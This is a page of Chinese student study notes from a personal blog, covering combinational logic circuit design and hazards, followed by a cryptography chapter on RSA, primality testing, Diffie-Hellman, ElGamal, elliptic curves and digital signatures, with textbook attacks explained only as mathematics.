<h1 id="4-2-组合逻辑电路设计"><a href="#4-2-组合逻辑电路设计" class="headerlink" title="4.2 组合逻辑电路设计"></a>4.2 组合逻辑电路设计</h1><p>设计的首要任务是将文字描述的设计要求抽象为一种逻辑关系，即抽象出描述问题的逻辑表达式，然后根据表达式画逻辑电路。逻辑电路可以使用们短路（小规模）、中规模集成电路进行组合，也可使用可编程大规模集成电路实现。</p>
<p>设计的一般步骤：</p>
<ul>
<li>确定输入、输出，列出真值表</li>
<li>写出表达式并简化</li>
<li>画出卡诺图</li>
<li>求出最简与或表达式</li>
<li>如果需要进行形式变换则进行，否则跳过</li>
<li>画出逻辑电路图</li>
</ul>
<p>包含无关条件的组合逻辑电路设计</p>
<ul>
<li>在一些实际问题中，输入变量之间存在相互制约或问题的某种特殊限定等，使逻辑函数与输入变量的某些取值组合无关。</li>
<li>描述此类问题的逻辑函数称为包含无关条件的逻辑函数</li>
<li>采用“最小项之和”表达式描述一个包含无关条件的逻辑问题时，函数表达式中是否包含无关项，以及对无关项是令其值为0还是1，并不影响函数的实际逻辑功能</li>
<li>在化简此类逻辑函数时，利用无关项的随意性往往可以使逻辑函数得到更好地简化，从而使设计的电路达到更简</li>
</ul>
<h1 id="4-3-组合逻辑电路的险象"><a href="#4-3-组合逻辑电路的险象" class="headerlink" title="4.3 组合逻辑电路的险象"></a>4.3 组合逻辑电路的险象</h1><p>实际情况下需要考虑信号传输的时延问题。实际上，信号经过任何逻辑门和导线都会产生时间延迟，这就使得当电路所有输入达到稳定状态时，输出并不是立即达到稳定状态。<br>延迟时间对数字系统是一个有害的因素。一般会造成系统运行速度下降，电路中信号的波形参数变坏，以及产生竞争险象等问题。</p>
<ul>
<li>逻辑电路中各路径上延迟时间的长短与信号经过的门的级数有关，与具体逻辑门的时延大小有关，还与导线的长短有关。</li>
<li>因此，输入信号经过不同路径到达输出端的时间有先有后，这种现象称为竞争现象。</li>
</ul>
<p>竞争现象分为临界竞争和非临界竞争。</p>
<ul>
<li>不产生错误输出的称为非临界竞争</li>
<li>导致错误输出的竞争称为临界竞争，被称为<strong>险象</strong><ul>
<li>这种险象是一种瞬态险象</li>
<li>它表现为在输出端陈胜不应有的尖脉冲，暂时地破坏正常逻辑关系</li>
<li>一旦瞬态过程结束，即可恢复正常逻辑关系</li>
</ul>
</li>
</ul>
<p>险象分类：</p>
<ul>
<li>静态险象：在输入变化而输出不应发生变化的情况下，输出端产生了短暂的错误输出</li>
<li>动态险象：在输入变化而输出应该发生变化的情况下，输出在变化过程中产生了短暂的错误输出。</li>
<li>“0”型险象：错误输出信号为负脉冲</li>
<li>“1”型险象：错误输出信号为正脉冲</li>
</ul>
<p>险象的判断：代数法和卡诺图法</p>
<ul>
<li>代数法：检查函数表达式中是否存在具备竞争条件的变量，是否有某个变量同时以原变量和反变量的形式出现在函数表达式中。<ul>
<li>如果具备，则代入其他变量，看函数表达式是否会成为$X\cdot \bar X$和$X+ \bar X$。</li>
<li>若会，则说明对应的逻辑电路可能产生险象。</li>
</ul>
</li>
<li>卡诺图法：画出函数卡诺图，画出和函数表达式中各项“与”项对应的卡诺圈。<ul>
<li>若卡诺圈之间存在“相切”关系，则可能产生险象。</li>
</ul>
</li>
</ul>
<p>消除险象的方法：增加冗余项（√）、增加惯性延时环节、选通法<br>在代数法中，增加冗余项的方法是：记下某个变量产生险象时其他变量的取值，将其全部取反之后相与，加上这一项即可。<br>卡诺图法中，增加卡诺圈消除相切即可。</p>
<h1 id="解题指南"><a href="#解题指南" class="headerlink" title="解题指南"></a>解题指南</h1><p>五、分析题</p>
<ol>
<li>略</li>
<li>(1) 写出逻辑表达式：<br>$$F&#x3D;\overline{\overline{ABC}A+\overline{ABC}B+\overline{ABC}C}\<br>&#x3D;(ABC+\overline A)(ABC+\overline B)(ABC+\overline C)\<br>&#x3D;ABC+\overline{ABC}$$<br>(2) 结果简单，直接描述功能：判断三个输入是否都相等<br>(3) 简化电路图：<br><img src="https://img-blog.csdnimg.cn/ad1ed3b321274983a377b70d1848cad3.png"></li>
</ol>
<p>六、设计题</p>
<ol>
<li>(1) 功能描述：比较两个二位二进制数<br>(2) 输入：4个；输出：1个。真值表：</li>
</ol>
<table>
<thead>
<tr>
<th align="center">B1B0\A1A0</th>
<th align="center">00</th>
<th align="center">01</th>
<th align="center">11</th>
<th align="center">10</th>
</tr>
</thead>
<tbody><tr>
<td align="center">00</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">01</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">0</td>
</tr>
</tbody></table>
<p>(3) 表达式：$Z&#x3D;A_1\overline{B_1}+\overline{B_1}\cdot\overline{B_0}A_0+\overline{B_1}A_1A_0$<br>(4) 电路图：<br><img src="https://img-blog.csdnimg.cn/910e7ebffa614a03a7eba919248cf424.png"></p>
<ol start="2">
<li>本题的关键在于使用与非门设计。<br>(1) 输入：4个，输出：1个。真值表：</li>
</ol>
<table>
<thead>
<tr>
<th align="center">A3A2\A1A0</th>
<th align="center">00</th>
<th align="center">01</th>
<th align="center">11</th>
<th align="center">10</th>
</tr>
</thead>
<tbody><tr>
<td align="center">00</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">01</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">0</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">0</td>
</tr>
</tbody></table>
<p>(2) 表达式：<br>$$Z&#x3D;A_2\overline{A_1}A_0+\overline{A_2}A_1A_0+\overline{A_3}A_1\overline{A_0}\<br>&#x3D;\overline{\overline{A_2\overline{A_1}A_0+\overline{A_2}A_1A_0+\overline{A_3}A_1\overline{A_0}}}\<br>&#x3D;\overline{\overline{A_2\overline{A_1}A_0}\cdot\overline{\overline{A_2}A_1A_0}\cdot\overline{\overline{A_3}A_1\overline{A_0}}}\<br>&#x3D;\overline{\overline{\overline{A_2A_1}A_2A_0}\cdot\overline{\overline{A_2A_1}A_1A_0}\cdot\overline{\overline{A_3A_1}\cdot\overline{A_1A_0}A_1}}$$<br>(3) 电路图：略</p>
<ol start="3">
<li>(1) 输入：4个，输出：4个；真值表：</li>
</ol>
<table>
<thead>
<tr>
<th align="center">A3A2\A1A0</th>
<th align="center">00</th>
<th align="center">01</th>
<th align="center">11</th>
<th align="center">10</th>
</tr>
</thead>
<tbody><tr>
<td align="center">00</td>
<td align="center">0011</td>
<td align="center">0100</td>
<td align="center">0110</td>
<td align="center">0101</td>
</tr>
<tr>
<td align="center">01</td>
<td align="center">0111</td>
<td align="center">1011</td>
<td align="center">1101</td>
<td align="center">1100</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">1110</td>
<td align="center">1111</td>
<td align="center">dddd</td>
<td align="center">dddd</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">dddd</td>
<td align="center">dddd</td>
<td align="center">dddd</td>
<td align="center">dddd</td>
</tr>
</tbody></table>
<p>(2) 表达式：<br>$$Z_0&#x3D;\overline{A_3}\cdot\overline{A_1}\cdot\overline{A_0}+\overline{A_3}\cdot\overline{A_2}\cdot\overline{A_0}+A_2A_0\<br>Z_1&#x3D;\overline{A_1}\cdot\overline{A_0}+A_2\overline{A_1}+\overline{A_2}A_1A_0\<br>Z_2&#x3D;\overline{A_2}A_0+\overline{A_3}A_1+A_3\overline{A_1}+A_2\overline{A_0}$$</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-5%E2%80%94%E2%80%94%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-5%E2%80%94%E2%80%94%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/" class="post-title-link" itemprop="url">密码学基础 Chapter 5——公钥密码体制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:16" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:16+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h1><h2 id="对称密钥的三大问题"><a href="#对称密钥的三大问题" class="headerlink" title="对称密钥的三大问题"></a>对称密钥的三大问题</h2><ol>
<li>密钥交换</li>
<li>密钥管理：每两个用户之间的密钥都不相同</li>
<li>抵赖行为：不承认发送过某条消息</li>
</ol>
<h2 id="单向陷门函数"><a href="#单向陷门函数" class="headerlink" title="单向陷门函数"></a>单向陷门函数</h2><p>希望可以找到一个密码体制，对于给定的加密e<del>k</del>，除了消息接受者，求d<del>k</del>在计算上不可行。其中e<del>k</del>可公开，无需分享密钥。<br>单向函数：一个函数容易计算但求逆困难。（还没有一个函数没证明单向）<br>单向陷门函数：存在一个单向函数，该函数在具有特定知识（称为陷门）后容易求逆</p>
<h2 id="单向函数定义"><a href="#单向函数定义" class="headerlink" title="单向函数定义"></a>单向函数定义</h2><p>假定n&#x3D;pq（p、q为不同的大素数），b为正整数，定义f：Z<del>n</del>→Z<del>n</del>，f(x)&#x3D;x^b^ mod n<br>陷门：大数n的因式分解<br>若已知n的因式分解n&#x3D;pq，则$\varphi(n)$&#x3D;(p-1)(q-1)<br>若gcd(b,φ(n))&#x3D;1，且ab$\equiv$ 1 mod φ(n)<br>f^-1^：Z<del>n</del>→Z<del>n</del>，f^-1^(x)&#x3D;x^a^ mod n</p>
<h2 id="公钥密码使用方式"><a href="#公钥密码使用方式" class="headerlink" title="公钥密码使用方式"></a>公钥密码使用方式</h2><p>用于加密：公钥加密私钥解密，无需交换密钥<br>用于认证：防止抵赖，如果要证明某文件为自己生成，则可以使用自己的私钥加密，其他人接收到之后通过公钥验证签名，用手中的所有公钥尝试，使用谁的公钥能够解密就是谁生成的文件</p>
<h1 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h1><h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><p>欧拉定理：$(a,n)&#x3D;1,a^{\varphi(n)}\equiv 1\pmod n$<br>费马小定理：$a^p\equiv a\pmod p$</p>
<h2 id="密码算法"><a href="#密码算法" class="headerlink" title="密码算法"></a>密码算法</h2><p>n&#x3D;pq，K&#x3D;{(n,p,q,e,d): ed$\equiv$ 1 mod φ(n)}<br>定义$e_k(x)&#x3D;x^e\pmod n,d_k(y)&#x3D;y^d\pmod n,(x,y\in Z_n)$，(n,e)为公钥，(n,d)为私钥</p>
<h2 id="参数生成"><a href="#参数生成" class="headerlink" title="参数生成"></a>参数生成</h2><p>素性检测、公私钥对<br>加解密过程的快速实现：</p>
<ul>
<li>平方-乘算法</li>
<li>蒙哥马利算法</li>
<li>中国剩余定理加速解密</li>
</ul>
<h3 id="平方-乘算法"><a href="#平方-乘算法" class="headerlink" title="平方-乘算法"></a>平方-乘算法</h3><p>要计算$a^b\mod n$：<br>$$b&#x3D;\sum_{i&#x3D;0}^{l-1}b_i2^i,b_i\in{0,1},b_{l-1}&#x3D;1\<br>b&#x3D;b_{l-1}2^{l-1}+b_{l-2}2^{l-2}+…+b_1\cdot 2+b_0\<br>&#x3D;2(2(…(2(b_{l-1})+b_{l-2})+…)+b_1)+b_0\<br>a^b&#x3D;a^{\sum_{i&#x3D;0}^{l-1}b_i2^i}&#x3D;(((…(1\times a^{b_{l-1}})^2\times a^{b_{l-2}})^2\times …)^2\times a^{b_1})^2\times a^{b_0}$$<br>（实际上就是模平方重复法的变体）<br><img src="https://img-blog.csdnimg.cn/023b3b9aa9384384b16254a175ada844.jpeg"><br>如上图示例：<br>9726^2^ $\equiv$ 2659(mod 11413)<br>2659^2^ $\equiv$ 5634(mod 11413)</p>
<h3 id="蒙哥马利算法"><a href="#蒙哥马利算法" class="headerlink" title="蒙哥马利算法"></a>蒙哥马利算法</h3><p><strong>蒙哥马利变换</strong><br>d&#x3D;2^32^，2^64^，假设d&#x3D;2^32^<br>模N：：k&#x3D;32n比特奇数，IN&#x3D;-N^-1^ mod 2^32^<br>R&#x3D;d^n^&gt;N，(R,N)&#x3D;1，a,b∈Z<del>N</del><br>A&#x3D;Mont(a) &#x3D; aR mod N<br>MontInv(A) &#x3D; AR^-1^ mod N<br>MontInv(Mont(a)) &#x3D; a mod N</p>
<p>A &#x3D; Mont(a), B &#x3D; Mont(b)<br>MontMult(A,B)&#x3D;ABR^-1^ &#x3D; aRbRR^-1^ &#x3D; abR mod N &#x3D; Mont(ab mod N)<br>MontMult(A,MontMult(A,A))&#x3D;Mont(a^3^ mod N)</p>
<p>MontMult(A,B) &#x3D; ABR^-1^ mod N<br>T &#x3D; AB, 2n位整数，T&#x3D;(0t<del>2n-1</del>t<del>2n-2</del>…t<del>1</del>t<del>0</del>)<br>计算T’&#x3D;T+N×((t<del>0</del>×IN) mod 2^32^)<br>(1) T’ &#x3D; T mod N<br>(2) T’ &#x3D; t<del>0</del>+(N×IN)t<del>0</del> &#x3D; 0 mod 2^32^<br>(3) T’ &gt;&gt; 32, T’ &#x3D; T×2^32^ mod N<br>令T&#x3D;T’, 重复上述步骤n次，T×2^-32n^ &#x3D; TR^-1^ mod N<br>T’ &#x3D; (0ct<del>n-1</del>‘t<del>n-2</del>‘…t<del>0</del>‘)，如果T’&gt;N，返回T’-N，否则返回T’&#x3D;(t<del>n-1</del>‘t<del>n-2</del>‘…t<del>0</del>‘)</p>
<p>快速模幂运算a^e^ mod N</p>
<h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p>把解密时的一个式子拆成两个式子来算（模p和q）</p>
<h3 id="素数定理"><a href="#素数定理" class="headerlink" title="素数定理"></a>素数定理</h3><p>$$\pi(N)\approx\frac{N}{\ln N}$$<br>若n&#x3D;pq，为1024比特，则p,q为512比特<br>$\frac{1}{\ln 2^{512}}\approx\frac{1}{355}$（为素数的概率）</p>
<h3 id="素性检测"><a href="#素性检测" class="headerlink" title="素性检测"></a>素性检测</h3><p><strong>费马素性检测</strong>：若p为素数，(a,p)&#x3D;1，则a^p-1^ &#x3D; 1 mod p</p>
<p><strong>伪素数</strong>：设n为奇合数，如果整数b，(b,n)&#x3D;1，使得b^n-1^&#x3D;1 mod n，则称n为对于基b的伪素数</p>
<p><strong>Euler伪素数</strong>：设n为正奇合数，整数b，(b,n)&#x3D;1，满足$b^{\frac{p-1}{2}}\equiv (\frac{b}{n})\mod n$，称n为对于基b的Euler伪素数</p>
<p>p-1&#x3D;2^s^t，$a^{p-1}-1&#x3D;(a^{2^{s-1}t}+1)(a^{2^{s-2}t}+1)…(a^{t}+1)(a^{t}+1)$<br>则下列同余式中至少有一个成立：<br>$a^t\equiv -1\mod p, a^{2t}\equiv -1\mod p,…,a^{2^{s-1}t}\equiv -1\mod p$<br><strong>强伪素数</strong>：设n为奇合数，n-1&#x3D;2^s^t，t为奇数，整数b与n互素，满足b^t^&#x3D;1 mod n，或者存在r，0≤r&lt;s，有$b^{2^rt}\equiv -1\mod n$，称n为对于基b的强伪素数</p>
<p><strong>Solovay-Strassen算法</strong><br>随机选择整数a在1到n-1之间，x&#x3D;$(\frac{a}{n})$，若x&#x3D;0则n为合数；若$x\equiv a^{\frac{n-1}{2}}\pmod n$则n是素数，否则为合数（计算雅可比符号）<br>判断具有1&#x2F;2的错误概率（若n为素数则输出一定为素数，若n为合数则有1&#x2F;2的概率输出为合数）</p>
<p><strong>Miller-Rabin算法</strong><br>n-1&#x3D;2^s^t的形式，其中t为奇数<br>随机选择整数a在1到n-1之间<br>计算$b&#x3D;a^t\mod n$<br>如果$b\equiv 1\pmod n$，那么n为素数；否则进行下列循环：<br>for i&#x3D;0 to s-1:<br>if $b\equiv -1\pmod n$，then n是素数<br>else b&#x3D;b^2^ mod n<br>若循环能结束则n为合数</p>
<p>若n为强伪素数，则输出可能为素数；若n为素数，则输出一定为素数，具有1&#x2F;4的错误概率，优于Solovay-Strassen算法</p>
<p><strong>AKS算法</strong><br>确定性素性检测方法<br>理论基础：$a\in Z,n\in N,n\ge 2,(a,n)&#x3D;1$，n是素数，当且仅当$(x+a)^n&#x3D;x^n+a\pmod n$<br>该算法为该理论复杂度的改进：$(x+a)^n&#x3D;x^n+a\pmod {x^r-1,n}$<br>算法的时间复杂度高于概率算法</p>
<ul>
<li>若存在整数a&gt;0且b&gt;1，满足n&#x3D;a^b^，则输出合数</li>
<li>找出满足$\operatorname {ord}_r(n)&gt;\log_2n$的最小的r</li>
<li>若对a≤r，1&lt;gcd(a,n)&lt;n，输出合数</li>
<li>若n≤r，输出素数</li>
<li>for a&#x3D;1 to $\lfloor{\sqrt{\varphi(r)}\log n}\rfloor$ do<ul>
<li>if (x+a)^n^≠x^n^+a (mod x^r^-1, n)，输出合数</li>
</ul>
</li>
<li>输出素数</li>
</ul>
<h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>给群组中每个人相同的公钥n，但指数e和d不同时可能产生共模攻击</p>
<ul>
<li>对于群组内成员，即使不分解n也可以解密其他人消息<br>$e_1d_1\equiv 1\mod \varphi(n),e_2d_2\equiv 1\mod \varphi(n)$<br>$e_2d_2’\equiv 1\mod(e_1d_1-1)\Rightarrow e_2d_2’\equiv 1\mod \varphi(n)$<br>（自己有$e_1,d_1$，因此可以计算$d_2’$）</li>
<li>群组外人员如果截获到发送给群组不同成员的同一消息，而两个加密指数互素，则可以直接恢复消息<br>令m为明文消息，加密指数为$e_1,e_2$，且二者互素，故存在r,s使得$re_1+se_2&#x3D;1$，假设r为负数<br>则$(c_1^{-1})^{-r}c_2^s&#x3D;m^{re_1+se_2}&#x3D;m\mod n$</li>
</ul>
<h2 id="小加密指数攻击"><a href="#小加密指数攻击" class="headerlink" title="小加密指数攻击"></a>小加密指数攻击</h2><p>若选择的e较小（如3），则加密会很快<br><strong>Coppersmith定理攻击</strong>：n为大整数，f为次数为e的多项式，可以在log n时间内有效计算出f(x)&#x3D;0 mod n的小于$n^{\frac{1}{e}}$的解。<br>应避免使用小的加密指数，e最少应选取2^16^+1&#x3D;65537<br>在短消息加密之前应该首先填充</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>教科书式的RSA方案是不安全的，速度慢是其主要缺点（硬件实现比DES慢1000倍，软件慢100倍，选择特定的e值能够大大加快RSA的速度）<br>可用于加密、密钥交换和数字签名</p>
<h1 id="Rabin密码体制"><a href="#Rabin密码体制" class="headerlink" title="Rabin密码体制"></a>Rabin密码体制</h1><p>设n&#x3D;pq，其中p,q为素数，均为4k+3型素数<br>P&#x3D;C&#x3D;Z<del>n</del>，且定义K&#x3D;{(n,p,q)}<br>对于k&#x3D;(n,p,q)，定义<br>$e_k(x)&#x3D;x^2\pmod n, d_k(y)&#x3D;\sqrt y\pmod n$<br>（x,y∈Z<del>n</del>），其中n为公钥，p、q为私钥</p>
<p>这是一个单向陷门函数，陷门为n的分解。f(x)&#x3D;x^2^ mod n</p>
<h1 id="公开密钥算法"><a href="#公开密钥算法" class="headerlink" title="公开密钥算法"></a>公开密钥算法</h1><p>加密：$C&#x3D;E_{K_{pub}}(P)$<br>解密：$P&#x3D;D_{K_{prv}}(C)$<br>两个密钥不能相互推导（或推导的难度不亚于密码分析）<br>其中一个密钥公开（$K_{pub}$），另一个密钥保密（$K_{prv}$）<br>每一个用户掌握一个私钥，并将相应的公钥放在公共目录中</p>
<p>问题：如何让别人正确知道你的公钥？（如何保证你发出的公钥不被篡改&#x2F;如何证明一个公钥是不是你的？）<br>答案：通过可信授权中心（PKI），每个人将自己的公钥发给PKI，由PKI为该公钥签名，相当于提供一个证书，在将这个有签名的公钥返还给用户。</p>
<h1 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h1><p>对于乘法群$(G,\cdot)$，一个n阶元素a∈G和β∈&lt;a&gt;<br>问题：找到唯一非负整数i不大于n-1，满足a^i^&#x3D;β<br>将整数i记为$\operatorname {ind}_{\alpha}(\beta)$，称为β的离散对数</p>
<h1 id="Diffie-Hellman算法"><a href="#Diffie-Hellman算法" class="headerlink" title="Diffie-Hellman算法"></a>Diffie-Hellman算法</h1><p>交换素数p和本原元g<br>Alice和Bob选择各自的私钥，Alice向Bob发送X&#x3D;g^x^ mod p，Bob向Alice发送Y&#x3D;g^y^ mod p。<br>之后Alice计算k&#x3D;Y^x^ mod p，Bob计算k&#x3D;X^y^ mod p，二者计算的值相等，实现密钥交换。</p>
<p>上述的密钥交换方案不安全。容易遭受中间人攻击。<br>如果Eve能够截获两者发送的X和Y，他用自己的密钥进行计算然后分别发送给Alice和Bob，这样A和B接收到的就是Eve的值。</p>
<h1 id="ElGamal密码体制"><a href="#ElGamal密码体制" class="headerlink" title="ElGamal密码体制"></a>ElGamal密码体制</h1><p>假设p为一个大素数，使得p构成乘法群上的离散对数问题难解。令α∈Z<del>p</del>是一个本原元，令P&#x3D;Z<del>p</del>*，C&#x3D;Z<del>p</del>*×Z<del>p</del>*，定义K&#x3D;{(p,α,a,β): β&#x3D;α^a^ mod p}<br>其中p,α,β为公钥，a为私钥。<br>对k&#x3D;(p,α,a,β)以及一个秘密的随机数r∈Z<del>p-1</del>，定义e<del>k</del>(x,r)&#x3D;(y<del>1</del>, y<del>2</del>)<br>其中y<del>1</del>&#x3D;α^r^ mod p, y<del>2</del>&#x3D;xβ^r^ mod p<br>定义d<del>k</del>(y<del>1</del>, y<del>2</del>)&#x3D;y<del>2</del>(y<del>1</del>^a^)^-1^ mod p<br>注意r在加密的时候需要随机选择，加密后应立即销毁不能在信道上传输。<br>加密运算具有不确定性。<br><font color=red>注意三个公钥中只有β与私钥a直接相关。</font></p>
<h1 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h1><p>设a,b∈R是满足$4a^3+27b^2\ne 0$的实常数，方程$y^2&#x3D;x^3+ax+b$所有解(x, y)∈R×R连同一个无穷远点$O$组成的集合E称为一个非奇异椭圆曲线。</p>
<p>从函数图像来看，椭圆曲线有两种，一种有一条线，一种有两条线</p>
<h2 id="Weierstrass方程"><a href="#Weierstrass方程" class="headerlink" title="Weierstrass方程"></a>Weierstrass方程</h2><p>定义在代数闭域$\bar K$上射影平面坐标的一般方程<br>$Y^2Z+a_1XYZ+a_3YZ^2&#x3D;X^3+a_2X^2Z+a_4XZ^2+a_6Z^3 (a_1,a_2,a_3,a_4,a_6\in\bar K)$<br>K上的射影平面P^2^(K)是K^3^&#x2F;{(0, 0, 0)}上关系<del>的等价类集合，每个等价类记作(X:Y:Z)<br>(X</del>1<del>,Y</del>1<del>,Z</del>1<del>) ~ (X</del>2<del>,Y</del>2<del>,Z</del>2~)<br>$F(X,Y,Z)&#x3D;Y^2Z+a_1XYZ+a_3YZ^2-X^3-a_2X^2Z-a_4XZ^2-a_6Z^3&#x3D;0$<br>非奇异：$\frac{\partial F}{\partial X},\frac{\partial F}{\partial Y},\frac{\partial F}{\partial Z}$在P点至少有一个非0。</p>
<p>椭圆曲线E：非奇异Weierstrass方程的所有P^2^($\bar K$)的解<br>y^2^+a<del>1</del>xy+a<del>3</del>y&#x3D;x^3^+a<del>2</del>x^2^+a<del>4</del>x+a<del>6</del></p>
<p>(E,+)是一个以无穷远点0为单位元的阿贝尔群，加法规则为：<br>$P+0&#x3D;0+P&#x3D;P\<br>-0&#x3D;0\<br>P&#x3D;(x_1,y_1)\ne 0, -P&#x3D;(x_1,-y_1-a_1x_1-a_3)\<br>Q&#x3D;-P,P+Q&#x3D;0<br>P,Q\ne 0,Q\ne -P,P+Q&#x3D;-R$<br>其中R为直线PQ或过点P的切线与椭圆曲线的第三个交点<br><img src="https://img-blog.csdnimg.cn/386924c7cd1246ecae2816711b0d0112.jpeg"><br>（当P和Q重合时，直线是曲线的切线，把y作为因变量对x求导计算$\frac{dy}{dx}$）</p>
<h2 id="椭圆曲线密码（ECC）"><a href="#椭圆曲线密码（ECC）" class="headerlink" title="椭圆曲线密码（ECC）"></a>椭圆曲线密码（ECC）</h2><p>阶：有限域F<del>q</del>上的椭圆曲线E(F<del>q</del>)由点组成，其上点的数量即为#E(F<del>q</del>)。称为椭圆曲线的阶。</p>
<p>倍点运算：P+P</p>
<p>椭圆曲线离散对数问题：已知曲线E(F<del>q</del>)，阶为n的点G∈E(F<del>q</del>)，P∈&lt;G&gt;，椭圆曲线离散对数问题是指确定整数k∈[0,…,n-1]使得P&#x3D;KG成立。</p>
<p>安全参数的选取：<br>(q, a, b, G, n, h)<br>对于特征为p的有限域F<del>q</del><br>其中a、b为椭圆曲线的参数，G为基点，阶为n，有限域F<del>q</del>的特征为p</p>
<p>$F_p(p&gt;3): y^2&#x3D;x^3+ax+b,a,b\in F_p,(4a^3+27b^2)\mod p\ne 0$<br>$F_{2^m}(p&#x3D;2): y^2+xy&#x3D;x^3+ax+b,a,b\in F_{2^m}, b\ne 0$</p>
<p>存在弱椭圆曲线：超奇异曲线（$p|q+1-#E(F_q)$）和异常曲线（$#E(F_q)&#x3D;p$）</p>
<p><strong>可以基于ECC构建DH密钥交换协议</strong>：首先选择公开参数$(q,F_q,E,G,n)$，Alice发送$P_a&#x3D;aG$，Bob发送$P_b&#x3D;bG$，二者交换后计算分别得到$S&#x3D;abG$即为私钥。（仍然易受到中间人攻击）</p>
<p><strong>也可以基于ECC构建ElGamal密码体制</strong>：首先选择公开参数$(q,F_q,E,G,n), A:(d_A,P_A),P_A&#x3D;d_AG$<br>B发送明文消息m给A需要加密：<br>随机选择$r\in Z_n$<br>计算$C_1&#x3D;rG, Q&#x3D;rP_A(Q_x\ne 0);C_2&#x3D;mQ_x$<br>发送$(C_1,C_2)$给A<br>解密：$d_AC_1&#x3D;d_ArG&#x3D;rP_A&#x3D;Q,m&#x3D;C_2Q_x^{-1}$</p>
<h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><p>签名方案：一个签名方案由一个五元组构成（P,A,K,S,V），其中<br>P是所有可能的消息组成的有限集<br>A是所有可能的签名组成的有限集<br>K是所有可能的密钥组成的有限集（密钥空间）<br>对于每一个k∈K，有一个秘密的签名函数sig<del>k</del>∈S和一个相应的公开的验证函数ver<del>k</del>∈V，sig<del>k</del>：P→A，ver<del>k</del>：P×A→{true, false}，满足：<br>当y&#x3D;sig<del>k</del>(x)时，ver<del>k</del>(x,y)&#x3D;true，否则为false</p>
<h2 id="RSA签名方案"><a href="#RSA签名方案" class="headerlink" title="RSA签名方案"></a>RSA签名方案</h2><p>设n&#x3D;pq，p，q为素数，P&#x3D;A&#x3D;Z<del>n</del>，定义K&#x3D;{(n,p,q,e,d): ed $\equiv$ 1 mod φ(n)}<br>对于k&#x3D;(n,p,q,e,d)，定义sig<del>k</del>(x)&#x3D;x^d^ mod n和ver<del>k</del>(x,y)&#x3D;true ↔ x&#x3D;y^e^ mod n<br>(x,y∈Z<del>n</del>)，(n,e)为公钥，(n,d)为私钥</p>
<p><strong>存在性伪造问题</strong>：任何人都可以伪造他人的签名y，对应消息为x&#x3D;e<del>k</del>(y)&#x3D;y^e^，一般这个消息是无意义的，但要防止攻击者计算大量的e<del>k</del>(y)，找出有意义的值从而伪造签名。<br>可以通过给消息添加可以识别的冗余信息或者对消息摘要后签名</p>
<p><strong>选择密文攻击</strong>：<br>假设A响应E的任何签名要求：$c&#x3D;m^e mod n$<br>$x&#x3D;r^e\mod n,y&#x3D;xc\mod n$<br>$y^d\mod n&#x3D;(xc)^d\mod n&#x3D;rc^d\mod n$<br>$r^{-1}y^d\mod n&#x3D;r^{-1}rc^d\mod n&#x3D;m$</p>
<p>若E想得到A关于消息m的签名，$m&#x3D;m_1m_2\mod n$，可以通过m<del>1</del>和m<del>2</del>的签名构造m的签名。<br>$m^d\mod n&#x3D;(m_1m_2)^d\mod n&#x3D;(m_1^d\mod n)(m_2^d\mod n)\mod n$</p>
<p>因此不要对陌生消息签名，签名之前先对消息求摘要、身份认证。</p>
<p><strong>签名和公钥加密结合的方案：</strong></p>
<ul>
<li>第一种方案：先签名后加密——$y&#x3D;sig_{Alice}(x),z&#x3D;e_{Bob}(x,y)$</li>
